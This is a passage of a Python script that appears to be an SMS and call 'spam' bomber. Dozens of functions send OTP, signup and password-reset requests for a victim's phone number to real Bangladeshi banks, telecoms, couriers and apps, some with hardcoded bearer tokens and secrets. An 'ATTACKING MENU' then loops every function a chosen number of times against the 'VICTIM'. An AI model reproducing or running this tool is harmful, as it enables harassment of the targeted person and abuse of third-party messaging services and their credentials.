            'priority': 'u=1, i',
            'referer': 'https://www.deeptoplay.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        params = {'country': 'BD', 'platform': 'web', 'language': 'en'}
        json_data = {'number': '+88'+number}
        requests.post('https://api.deeptoplay.com/v2/auth/login', params=params, headers=headers, json=json_data)
    except: pass
        
def lmnXlija_21(number):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://shikho.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://shikho.com/',
            'sec-ch-ua': lmnXaccessVersion2,
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': lmnXuserAgent1,
        }
        json_data = {'phone': number, 'type': 'student', 'auth_type': 'signup', 'vendor': 'shikho'}
        requests.post('https://api.shikho.com/auth/v2/send/sms', headers=headers, json=json_data)
    except: pass
        
def lmnXlija_22(number):
    try:
        url5 = "https://api.redx.com.bd/v1/user/signup"
        headers5 = CaseInsensitiveDict()
        headers5["Accept"] = "application/json, text/plain, */*"
        headers5["Content-Type"] = "application/json"
        headers5["User-Agent"] = lmnXuserAgent3
        data5 = '{"name":"961096106","phoneNumber":"'+number+'","service":"redx"}'
        requests.post(url5, headers=headers5, data=data5)
    except: pass
    
def lmnXlija_23(number):
    try:
        requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
    except: pass
    
def lmnXlija_24(number):
    try: requests.post('https://www.bioscopelive.com/en/login/send-otp?phone=88'+number+'&operator=bd-otp')
    except: pass
    
def lmnXlija_25(number):
    try: requests.post('https://ss.binge.buzz/otp/send/login'+number)
    except: pass
        
def lmnXlija_26(number):
    try:
        url3 = "https://fundesh.com.bd/api/auth/generateOTP?service_key="
        headers3 = CaseInsensitiveDict()
        headers3["Content-Type"] = "application/json"
        data3 = '{"msisdn":"'+number+'"}'
        requests.post(url3, headers=headers3, data=data3)
    except: pass

def lmnXlija_27(number):
    try:
        url = "https://applink.com.bd/appstore-v4-server/login/otp/request"
        headers = {"User-Agent": lmnXuserAgent4, "Referer": "https://applink.com.bd/", "Content-Type": "application/json", "Origin": "https://applink.com.bd"}
        data = {"msisdn": "88"+number}
        requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except: pass

def lmnXlija_28(number):
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {"User-Agent": lmnXuserAgent4, "domain-name": "chokrojan.com", "user-platform": "3", "company-id": "1", "Origin": "https://chokrojan.com", "Content-Type": "application/json"}
        data = json.dumps({"mobile_number": number})
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_29(number):
    try:
        url = "https://chokrojan.com/api/v1/passenger/login/mobile"
        headers = {"User-Agent": lmnXuserAgent4, "domain-name": "chokrojan.com", "user-platform": "3", "company-id": "1", "Origin": "https://chokrojan.com", "Content-Type": "application/json"}
        data = {"mobile_number": number}
        requests.post(url, headers=headers, data=json.dumps(data))
    except: pass

def lmnXlija_30(number):
    try:
        url = "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber"
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}
        data = {"AccessToken": "", "TrackingNo": "", "mobileNo": number, "otpSms": "", "product_id": "250", "requestChannel": "MOB", "trackingStatus": 5}
        requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except: pass

def lmnXlija_31(number):
    try:
        url = 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber'
        data = {'data': {'code': '88', 'contact_no': number, 'country_calling_code': '88', 'headers': {'PlatForm': 'Web'}}}
        headers = {'Content-type': 'application/json', 'Referer': 'https://doctime.com.bd/', 'Origin': 'https://doctime.com.bd', 'User-Agent': lmnXuserAgent4}
        requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except: pass

def lmnXlija_32(number):
    try:
        url = "https://core.easy.com.bd/api/v1/registration"
        headers = {"User-Agent": lmnXuserAgent4, "Referer": "https://easy.com.bd/", "Content-Type": "application/json"}
        data = {"name": "Limon Islam", "email": "uyrlhkgxqw@emergentvillage.org", "mobile": number, "password": "boss#2022", "password_confirmation": "boss#2022", "device_key": "9a28ae67c5704e1fcb50a8fc4ghjea4d"}
        requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except: pass

def lmnXlija_33(number):
    try:
        url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"}
        data = {"type": "phone", "phone": number}
        requests.post(url, headers=headers, data=json.dumps(data), verify=False)
    except: pass

def lmnXlija_34(number):
    try:
        api_url = 'https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber'
        data = {'AccessToken': '', 'TrackingNo': '', 'mobileNo': number, 'otpSms': '', 'product_id': '122', 'requestChannel': 'MOB', 'trackingStatus': 5}
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent4}
        requests.post(api_url, json=data, headers=headers)
    except: pass

def lmnXlija_35(number):
    try:
        url = f"https://api.mygp.cinematic.mobi/api/v1/otp/88{number}/SBENT_3GB7D"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"}
        data = {"accessinfo": {"access_token": "K165S6V6q4C6G7H0y9C4f5W7t5YeC6", "referenceCode": "20190827042622"}}
        requests.post(url, json=data, headers=headers)
    except: pass

def lmnXlija_36(number):
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {"phone": number, "email": "", "language": "en"}
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent5}
        requests.post(url, json=data, headers=headers)
    except: pass

def lmnXlija_37(number):
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json", "Content-Length": "0"}
        requests.post(url, headers=headers)
    except: pass

def lmnXlija_38(number):
    try:
        url = f"http://apibeta.iqra-live.com/api/v1/sent-otp/{number}"
        requests.get(url, verify=False)
    except: pass

def lmnXlija_39(number):
    try:
        url = "https://smart1216.robi.com.bd/robi_sivr/public/login/phone"
        number_clean = number.lstrip('0')
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}
        data = {"cli": ""+number_clean}
        requests.post(url, headers=headers, json=data, verify=False)
    except: pass

def lmnXlija_40(number):
    try:
        url = "https://user-api.jslglobal.co:444/v1/send-otp"
        headers = {"User-Agent": lmnXuserAgent6, "Origin": "https://rental.jatri.co", "Referer": "https://rental.jatri.co/"}
        data = {"phone": "+88"+number, "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_41(number):
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {"User-Agent": lmnXuserAgent7, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"PhoneNumber": number}
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_42(number):
    try:
        url = "https://mithaibd.com/api/login/?lang_code=en¤cy_code=BDT"
        headers = {"user-agent": "okhttp/4.2.2", "Authorization": "Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==", "Content-Type": "application/json"}
        data = json.dumps({"company_id": "2", "password2": "Rahu333@@", "currency_code": "BDT", "user_type": "C", "email": "fuckyoubro"+number+"@gmail.com", "g_id": "", "lang_code": "en", "operating_system": "Android", "otp_verify": False, "password1": "Rahu333@@", "phone": number, "storefront_id": "5"})
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_43(number):
    try:
        url = "https://api.englishmojabd.com/api/v1/auth/login"
        data = {"phone": "+88"+number}
        headers = {"Content-Type": "application/json"}
        requests.post(url, headers=headers, data=json.dumps(data))
    except: pass

def lmnXlija_44(number):
    try:
        url = "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp"
        headers = {"User-Agent": lmnXuserAgent4, "Origin": "https://moveon.com.bd", "Referer": "https://moveon.com.bd/auth/register", "Content-Type": "application/json"}
        data = json.dumps({"phone": number})
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_45(number):
    try:
        url = "https://api.osudpotro.com/api/v1/users/send_otp"
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}
        data = json.dumps({"mobile": "+88-"+number, "deviceToken": "app", "language": "bn", "os": "android"})
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_46(number):
    try:
        url = f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{number}&lang=en&ng=0"
        headers = {"user-agent": lmnXuserAgent8}
        requests.get(url, headers=headers, verify=False)
    except: pass

def lmnXlija_47(number):
    try:
        url = "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php"
        headers = {"Content-Type": "application/json", "User-Agent": lmnXuserAgent4}
        data = json.dumps({"full_name": "Hangama", "company_name": "Hangama", "email_address": "hangama@gmail.com", "phone_number": number})
        requests.post(url, headers=headers, data=data, verify=False)
    except: pass

def lmnXlija_48(number):
    try:
        url = "https://auth.qcoom.com/api/v1/otp/send"
        headers = {"User-Agent": lmnXuserAgent4, "Referer": "https://qcoom.com/", "Content-Type": "application/json"}
        data = {"mobileNumber": "+88"+number}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_49(number):
    try:
        url = "https://reseller.circle.com.bd/api/v2/auth/signup"
        headers = {"User-Agent": lmnXuserAgent7, "Content-Type": "application/json"}
        data = {"name": "+88"+number, "email_or_phone": "+88"+number, "password": "123456lmn", "password_confirmation": "123456lmn", "register_by": "phone"}
        requests.post(url, data=data, headers=headers)
    except: pass

def lmnXlija_50(number):
    try:
        url = "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s"}
        data = {"phone": number}
        requests.post(url, headers=headers, json=data, verify=False)
    except: pass

def lmnXlija_51(number):
    try:
        url = "https://api-gateway.sundarbancourierltd.com/graphql"
        data = {"operationName": "CreateAccessToken", "variables": {"accessTokenFilter": {"userName": number}}, "query": "mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: $accessTokenFilter) { message statusCode result { phone otpCounter __typename } __typename } }"}
        headers = {'Content-Type': 'application/json', 'Host': 'api-gateway.sundarbancourierltd.com', 'User-Agent': lmnXuserAgent10}
        requests.post(url, json=data, headers=headers)
    except: pass

def lmnXlija_52(number):
    try:
        url = "https://api.toybox.live/bdapps_handler.php"
        data = {"Operation": "CreateSubscription", "MobileNumber": "88"+number, "PackageID": 100, "Secret": "HJKX71%UHYH"}
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent11}
        requests.post(url, headers=headers, data=json.dumps(data))
    except: pass

def lmnXlija_53(number):
    try:
        url = "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88"+number
        headers = {'sourcePlatform': 'web', 'client': '2'}
        requests.get(url, headers=headers)
    except: pass

def lmnXlija_54(number):
    try:
        url = "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp"
        data = {"deviceId": "7dtdhid45c0f0901", "deviceInfo": {"deviceInfoSignature": "D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA", "deviceId": "7d8b0agi0g0f0901", "firebaseDeviceToken": "", "manufacturer": "MI", "modelName": "NOTE 10", "osFirmWireBuild": "", "osName": "Android", "osVersion": "10", "rootDevice": 0}, "operator": "Gp", "walletNumber": number}
        headers = {"Content-Type": "application/json"}
        requests.post(url, json=data, headers=headers)
    except: pass

def lmnXlija_55(number):
    try:
        url = "https://rootsedulive.com/api/auth/register"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"name": "Pagli Khatun", "phone": f"88{number}", "email": f"subap{number}agli2023@gmail.com", "password": "iDSnWh6rzp9KNAY", "confirmPassword": "iDSnWh6rzp9KNAY"}
        requests.post(url, data=data, headers=headers, verify=False)
    except: pass

def lmnXlija_56(number):
    try:
        url = "https://rootsedulive.com/api/auth/forget-password"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        data = {"phoneOrEmail": f"88{number}"}
        requests.post(url, data=data, headers=headers, verify=False)
    except: pass

def lmnXlija_57(number):
    try:
        url = "https://www.mcbaffiliate.com/Affiliate/RequestOTP"
        headers = {"User-Agent": lmnXuserAgent7, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"PhoneNumber": number}
        requests.post(url, data=data, headers=headers, verify=False)
    except: pass

def lmnXlija_58(number):
    try:
        url = f"https://app.hishabee.business/api/V2/otp/send?mobile_number={number}"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"}
        requests.post(url, headers=headers, verify=False)
    except: pass

def lmnXlija_59(number):
    try:
        url = "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp"
        data = {"phone": number, "email": "", "language": "en"}
        headers = {'Content-Type': 'application/json', 'User-Agent': lmnXuserAgent9}
        requests.post(url, json=data, headers=headers, verify=False)
    except: pass

def lmnXlija_60(number):
    try:
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{number}/"
        headers = {"User-Agent": lmnXuserAgent4, "Content-Type": "application/json"}
        requests.post(url, headers=headers, verify=False)
    except: pass


#----------[ ATTACKING MENU ]----------#


def DARKS(number,amo):
    os.system("clear")
    print_banner()
    print("\n"*2)
    console.print(Align.center("[bold yellow]INFO"))
    console.print(Align.center(Panel.fit(f"[bold blue]⚡[bold green]  SMS & CALL SPAM [bold cyan]v2.0 [bold red]STARTED\n"
     f"[green]VICTIM [bold white]| [bold green]NUMBER ➤ [bold yellow]{number} | AMMOUNT ➤ [bold red]{amo}", border_style="bold cyan")))
    
    console.rule("[bold cyan]ATTACK STARTED")
    print("\n")
    for x in range(amo):
        x+=1
        lmnXlija_1(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-01]")
        lmnXlija_2(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-02]")
        lmnXlija_3(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-03]")
        lmnXlija_4(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-04]")
        lmnXlija_5(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-05]")
        lmnXlija_6(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-06]")
        lmnXlija_7(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-07]")
        lmnXlija_8(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-08]")
        lmnXlija_9(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-09]")
        lmnXlija_10(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-10]")
        lmnXlija_11(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-11]")
        lmnXlija_12(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-12]")
        lmnXlija_13(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-13]")
        lmnXlija_14(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-14]")
        lmnXlija_15(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-15]")
        lmnXlija_16(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-16]")
        lmnXlija_17(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-17]")
        lmnXlija_18(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-18]")
        lmnXlija_19(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-19]")
        lmnXlija_20(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-20]")
        lmnXlija_21(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-21]")
        lmnXlija_22(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-22]")
        lmnXlija_23(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-23]")
        lmnXlija_24(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-24]")
        lmnXlija_25(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-25]")
        lmnXlija_26(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-26]")
        lmnXlija_27(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-27]")
        lmnXlija_28(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-28]")
        lmnXlija_29(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-29]")
        lmnXlija_30(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-30]")
        lmnXlija_31(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-31]")
        lmnXlija_32(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-32]")
        lmnXlija_33(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-33]")
        lmnXlija_34(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-34]")
        lmnXlija_35(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-35]")
        lmnXlija_36(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-36]")
        lmnXlija_37(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-37]")
        lmnXlija_38(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-38]")
        lmnXlija_39(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-39]")
        lmnXlija_40(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-40]")
        lmnXlija_41(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-41]")
        lmnXlija_42(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-42]")
        lmnXlija_43(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-43]")
        lmnXlija_44(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-44]")
        lmnXlija_45(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-45]")
        lmnXlija_46(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-46]")
        lmnXlija_47(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-47]")
        lmnXlija_48(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-48]")
        lmnXlija_49(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-49]")
        lmnXlija_50(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-50]")
        lmnXlija_51(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-51]")
        lmnXlija_52(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-52]")
        lmnXlija_53(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-53]")
        lmnXlija_54(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-54]")
        lmnXlija_55(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-55]")
        lmnXlija_56(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-56]")
        lmnXlija_57(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-57]")
        lmnXlija_58(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-58]")
        lmnXlija_59(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-59]")
        lmnXlija_60(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mSPAM SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-60]")
        lmnXlija_61(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mEYECON SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-61]")
        lmnXlija_62(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mROCKET SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-62]")
        lmnXlija_63(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-63]")
        lmnXlija_64(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-64]")
        lmnXlija_65(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-65]")
        lmnXlija_66(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-66]")
        lmnXlija_67(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-67]")
        lmnXlija_68(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-68]")
        lmnXlija_69(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-69]")
        lmnXlija_70(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-70]")
        lmnXlija_71(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-71]")
        lmnXlija_72(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-72]")
        lmnXlija_73(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-73]")
        lmnXlija_74(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-74]")
        lmnXlija_75(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-75]")
        lmnXlija_76(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-76]")
        lmnXlija_77(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-77]")
        lmnXlija_78(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-78]")
        lmnXlija_79(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-79]")
        lmnXlija_80(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-80]")
        lmnXlija_81(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-81]")
        lmnXlija_82(number);BDCYBER(f"    \033[94m\033[1m[💣] \033[93mWEB API SENT \033[96m[\033[92mOK\033[96m]\033[0m-\033[78m\033[1m[{x}-82]")
    print("\n")
    lnx()
